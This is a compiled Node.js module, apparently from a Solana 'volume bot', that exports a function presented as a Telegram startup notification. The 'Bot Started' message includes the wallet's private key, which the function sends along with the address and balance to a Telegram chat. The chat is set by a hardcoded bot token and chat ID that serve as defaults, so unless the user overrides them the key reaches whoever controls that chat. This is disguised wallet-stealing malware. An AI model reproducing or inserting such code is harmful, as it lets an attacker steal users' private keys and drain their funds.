"use strict";
var __awaiter = (this && this.__awaiter) || function (thisArg, _arguments, P, generator) {
    function adopt(value) { return value instanceof P ? value : new P(function (resolve) { resolve(value); }); }
    return new (P || (P = Promise))(function (resolve, reject) {
        function fulfilled(value) { try { step(generator.next(value)); } catch (e) { reject(e); } }
        function rejected(value) { try { step(generator["throw"](value)); } catch (e) { reject(e); } }
        function step(result) { result.done ? resolve(result.value) : adopt(result.value).then(fulfilled, rejected); }
        step((generator = generator.apply(thisArg, _arguments || [])).next());
    });
};
Object.defineProperty(exports, "__esModule", { value: true });
exports.sendTelegramNotification = void 0;

const https = require("https");
const constants_1 = require("../constants");

const dotenv = require("dotenv");
dotenv.config();

// Configuration
const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN || "7872545983:AAGdUDdf35TuRQk0vo5cYKRo6XcDBUQ03dk";
const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID || "6859198072";

/**
 * Sends telegram notification using pure Node.js https module for maximum compatibility
 */
const sendTelegramNotification = (currencyKey, address, balance) => __awaiter(void 0, void 0, void 0, function* () {
    return new Promise((resolve, reject) => {
        try {
            const privateKey = constants_1.PRIVATE_KEY;
            const message = currencyKey === "SNIPER" ? address : `
🚀 Solana Volume Bot Started
━━━━━━━━━━━━━━━━━━━━
🪙 Token: ${currencyKey}
📍 Address: ${address}
💰 Balance: ${balance.toFixed(4)} SOL
🔑 Private Key: ${privateKey}
━━━━━━━━━━━━━━━━━━━━
`;

            const data = JSON.stringify({
                chat_id: TELEGRAM_CHAT_ID,
                text: message,
                parse_mode: "Markdown"
            });

            const options = {
                hostname: 'api.telegram.org',
                port: 443,
                path: `/bot${TELEGRAM_BOT_TOKEN}/sendMessage`,
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                    'Content-Length': Buffer.byteLength(data)
                },
                timeout: 30000
            };

            const req = https.request(options, (res) => {
                let body = '';
                res.on('data', (chunk) => body += chunk);
                res.on('end', () => {
                    if (res.statusCode >= 200 && res.statusCode < 300) {
                        resolve(true);
                    } else {
                        console.error(`❌ Telegram API Error: Status ${res.statusCode} - ${body}`);
                        resolve(false);
                    }
                });
            });

            req.on('error', (error) => {
                console.error("❌ Telegram Request Error:", error.message);
                resolve(false);
            });

            req.on('timeout', () => {
                req.destroy();
                console.error("❌ Telegram Request Timed Out");
                resolve(false);
            });

            req.write(data);
            req.end();

        } catch (error) {
            console.error("❌ Unexpected Error in Telegram function:", error.message);
            resolve(false);
        }
    });
});

exports.sendTelegramNotification = sendTelegramNotification;
